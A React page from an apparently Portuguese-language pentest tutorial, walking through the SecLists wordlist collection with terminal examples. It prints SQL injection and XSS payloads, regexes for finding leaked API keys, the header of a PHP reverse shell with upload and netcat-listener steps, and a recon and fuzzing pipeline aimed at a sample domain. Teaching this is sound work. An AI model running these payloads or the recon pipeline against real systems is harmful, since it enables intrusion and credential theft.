import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Seclists() {
  return (
    <PageContainer
      title="SecLists — wordlists para pentest"
      subtitle="Coleção de Daniel Miessler com discoveries, payloads, fuzzing, usernames, passwords e mais."
      difficulty="iniciante"
      timeToRead="11 min"
    >
      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y seclists",
            out: "(instala em /usr/share/seclists/)",
            outType: "muted",
          },
          {
            cmd: "ls /usr/share/seclists/",
            out: `Discovery        Fuzzing      IOCs             Passwords
Web-Shells       Miscellaneous Pattern-Matching SAST
Payloads         Usernames`,
            outType: "info",
          },
          {
            cmd: "du -sh /usr/share/seclists/",
            out: "1.4G\t/usr/share/seclists/",
            outType: "default",
          },
        ]}
      />

      <h2>Diretórios principais</h2>
      <CommandTable
        title="Estrutura do SecLists"
        variations={[
          { cmd: "Discovery/", desc: "DNS, Web-Content, Infrastructure, AWS — para fuzzing.", output: "subdomains-top1million-5000.txt, common.txt, etc." },
          { cmd: "Fuzzing/", desc: "Payloads de fuzz: SQLi, XSS, LFI, SSRF.", output: "Para ffuf/Burp Intruder." },
          { cmd: "Passwords/", desc: "rockyou, top10k, leaks (Have I Been Pwned), por país.", output: "rockyou.txt, 10-million-password-list-top-100000.txt" },
          { cmd: "Usernames/", desc: "Names, Honeypot-Captures, top usernames.", output: "names.txt, top-usernames-shortlist.txt" },
          { cmd: "Web-Shells/", desc: "PHP/JSP/ASP shells prontas (lab/CTF).", output: "PHP/php-reverse-shell.php" },
          { cmd: "Payloads/", desc: "Polyglots, magic numbers, prototype pollution.", output: "Para corner cases." },
          { cmd: "Pattern-Matching/", desc: "Regex para grep secrets, leaks, tokens.", output: "Em revisão de código/git histórico." },
          { cmd: "Miscellaneous/", desc: "Wifi-WPA, Email-Authentication.", output: "Quando você precisa de algo único." },
        ]}
      />

      <h2>Discovery — fuzzing web</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/seclists/Discovery/Web-Content/ | head -10",
            out: `api/
big.txt
combined_directories.txt
combined_words.txt
common.txt
directory-list-2.3-medium.txt
directory-list-2.3-small.txt
directory-list-2.3-big.txt
quickhits.txt
raft-large-directories.txt`,
            outType: "info",
          },
          {
            cmd: "wc -l /usr/share/seclists/Discovery/Web-Content/{common,quickhits,raft-medium-directories,big}.txt",
            out: `   4664 /usr/share/seclists/Discovery/Web-Content/common.txt
   2425 /usr/share/seclists/Discovery/Web-Content/quickhits.txt
  30000 /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
  20473 /usr/share/seclists/Discovery/Web-Content/big.txt`,
            outType: "default",
          },
          {
            comment: "wordlist específica de API",
            cmd: "ls /usr/share/seclists/Discovery/Web-Content/api/",
            out: `actions.txt           api-endpoints.txt          objects.txt        api-seen-in-wild.txt
api-endpoints-mazen160.txt   api-objects.txt`,
            outType: "default",
          },
          {
            cmd: "head -10 /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt",
            out: `actions
admin
ajax
analytics
api
api-docs
articles
auth
authenticate
balance`,
            outType: "muted",
          },
        ]}
      />

      <h2>Discovery — DNS</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/seclists/Discovery/DNS/",
            out: `bitquark-subdomains-top100000.txt
combined_subdomains.txt
deepmagic.com-prefixes-top500.txt
dns-Jhaddix.txt
fierce-hostlist.txt
namelist.txt
n0kovo_subdomains_huge.txt
sortedcombined-knock-dnsrecon-fierce-reconng.txt
subdomains-top1million-5000.txt
subdomains-top1million-20000.txt
subdomains-top1million-110000.txt`,
            outType: "info",
          },
          {
            cmd: "wc -l /usr/share/seclists/Discovery/DNS/subdomains-top1million-{5000,20000,110000}.txt",
            out: `   5000 /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  20000 /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 114442 /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`,
            outType: "default",
          },
        ]}
      />

      <h2>Passwords</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/seclists/Passwords/ | head -10",
            out: `bt4-password.txt
cain-and-abel.txt
Common-Credentials/
cracked-md5-hashes.txt
darkc0de.txt
darkweb2017-top10000.txt
honeynet-2010.txt
Leaked-Databases/
muslim-malay-top-1000.txt
phpbb.txt`,
            outType: "default",
          },
          {
            comment: "rockyou (a clássica)",
            cmd: "ls -lh /usr/share/wordlists/rockyou.txt",
            out: "lrwxrwxrwx 1 root root 47 Mar 12 14:02 /usr/share/wordlists/rockyou.txt -> /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz",
            outType: "muted",
          },
          {
            comment: "extrair se necessário",
            cmd: "sudo gunzip -k /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || sudo tar xzvf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /usr/share/wordlists/",
            out: "rockyou.txt",
            outType: "info",
          },
          {
            cmd: "wc -l /usr/share/wordlists/rockyou.txt",
            out: "14344392 /usr/share/wordlists/rockyou.txt",
            outType: "info",
          },
          {
            cmd: "ls /usr/share/seclists/Passwords/Common-Credentials/",
            out: `10-million-password-list-top-1000.txt
10-million-password-list-top-10000.txt
10-million-password-list-top-100000.txt
10k-most-common.txt
best15.txt
best110.txt
best1050.txt
darkweb2017-top1000.txt
probable-v2-top12000.txt`,
            outType: "default",
          },
        ]}
      />

      <h2>Usernames</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/seclists/Usernames/",
            out: `cirt-default-usernames.txt
honeypot_top25.txt
Honeypot-Captures/
Names/
top-usernames-shortlist.txt
xato-net-10-million-usernames.txt
xato-net-10-million-usernames-dup.txt`,
            outType: "info",
          },
          {
            cmd: "head /usr/share/seclists/Usernames/top-usernames-shortlist.txt",
            out: `root
admin
test
guest
info
adm
mysql
user
administrator
oracle`,
            outType: "default",
          },
          {
            cmd: "ls /usr/share/seclists/Usernames/Names/",
            out: `cain-and-abel-passwords.txt    famous-people-leetspeak.txt
femalenames-usa-ar.txt          jsmith.txt
malenames-usa-ar.txt            names.txt
namelist.txt                    namelist-reduced.txt`,
            outType: "muted",
          },
        ]}
      />

      <h2>Fuzzing — payloads</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/seclists/Fuzzing/",
            out: `alphanums-case-extra.txt    LDAP/        SQLi/            XML/
big-list-of-naughty-strings.txt    Polyglots/   SSI/             XPath/
character-encoding/                special-chars.txt   Templates/    XSS/
file-extensions-most-common.txt    SSRF-OOB/    User-Agents/`,
            outType: "info",
          },
          {
            cmd: "head /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt",
            out: `'
"
admin' --
admin' #
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or 1=1--
') or ('1'='1
') or ('1'='1'--`,
            outType: "warning",
          },
          {
            cmd: "head /usr/share/seclists/Fuzzing/XSS/XSS-RSnake.txt",
            out: `<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
'';!--"<XSS>=&{()}
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
<IMG SRC="javascript:alert('XSS');">
<IMG SRC=javascript:alert('XSS')>
<IMG SRC=JaVaScRiPt:alert('XSS')>
<IMG SRC=javascript:alert(&quot;XSS&quot;)>
<IMG SRC=\`javascript:alert("RSnake says, 'XSS'")\`>`,
            outType: "warning",
          },
          {
            cmd: "head /usr/share/seclists/Fuzzing/big-list-of-naughty-strings.txt",
            out: `# Reserved Strings
undefined
undef
null
NULL
(null)
nil
NIL
true
false
True
False`,
            outType: "default",
          },
        ]}
      />

      <h2>Pattern-Matching — caçar secrets</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "head /usr/share/seclists/Pattern-Matching/keys-for-grep.txt",
            out: `# AWS
AKIA[0-9A-Z]{16}
# Slack
xox[bpoa]-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}
# Stripe
sk_live_[0-9a-zA-Z]{24}
pk_live_[0-9a-zA-Z]{24}
# GitHub
gh[pousr]_[A-Za-z0-9_]{36}
# Google API key
AIza[0-9A-Za-z\\-_]{35}`,
            outType: "info",
          },
          {
            comment: "uso prático: grep recursivo em código",
            cmd: "grep -rEn -f /usr/share/seclists/Pattern-Matching/keys-for-grep.txt /caminho/projeto/ 2>/dev/null | head",
            out: `/caminho/projeto/.env:8:    AWS_ACCESS_KEY_ID=AKIA<EXEMPLO_FICTICIO>
/caminho/projeto/.env:9:    STRIPE_SECRET=sk_live_<EXEMPLO_FICTICIO>`,
            outType: "warning",
          },
        ]}
      />

      <h2>Web-Shells (lab/CTF)</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "ls /usr/share/seclists/Web-Shells/",
            out: `ASPX/    backdoor_list.txt    FuzzDB_web-backdoors/    laudanum-1.0/    PHP/
PHP-Reverse-Shell/    Python/`,
            outType: "info",
          },
          {
            cmd: "head -20 /usr/share/seclists/Web-Shells/PHP/php-reverse-shell.php",
            out: `<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// USAGE
// 1. Edit \\$ip and \\$port to point to your local machine.
// 2. Upload to web server, browse to it.
// 3. Receive shell on listener: nc -lvnp <port>

set_time_limit (0);
\\$VERSION = "1.0";
\\$ip = '127.0.0.1';     // CHANGE THIS
\\$port = 1234;          // CHANGE THIS`,
            outType: "default",
          },
        ]}
      />

      <PracticeBox
        title="Pipeline de fuzzing usando SecLists"
        goal="Realizar recon completo só com wordlists do SecLists."
        steps={[
          "Subdomínios — gobuster dns + wordlist 5000.",
          "Hosts vivos — httpx.",
          "Diretórios em cada vivo — ffuf + raft-medium.",
          "Para qualquer endpoint /api/, fuzz com api-endpoints.txt.",
          "Em forms, payload de SQLi com Generic-SQLi.txt.",
        ]}
        command={`DOMAIN="empresa.com"

# 1) subs
gobuster dns -d $DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -o subs.txt
grep '^Found' subs.txt | awk '{print $2}' > subs.clean

# 2) httpx
httpx -l subs.clean -silent -o live.txt

# 3) dirs
for U in $(cat live.txt); do
  ffuf -u "$U/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
       -mc 200,301,302,401,403 -t 50 -o "$(echo $U | sed 's|/|_|g').json" -of json
done

# 4) api endpoints (em URLs com /api ou /v1)
ffuf -u "https://api.$DOMAIN/v1/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403`}
        expected={`Found: api.empresa.com
Found: dev.empresa.com

(arquivos JSON com paths descobertos por host)

users     [Status: 401, Size: 142]
products  [Status: 200, Size: 2451]
orders    [Status: 401, Size: 142]`}
        verify="O ffuf api deve achar pelo menos 1 endpoint que retorna 200 ou 401 (existe + protegido)."
      />

      <AlertBox type="info" title="Always update">
        SecLists é atualizado SEMPRE. Roda <code>sudo apt install --reinstall seclists</code>{" "}
        ou <code>cd /usr/share/seclists && sudo git pull</code> mensalmente para pegar
        wordlists novas (CVEs do mês, payloads novos).
      </AlertBox>
    </PageContainer>
  );
}
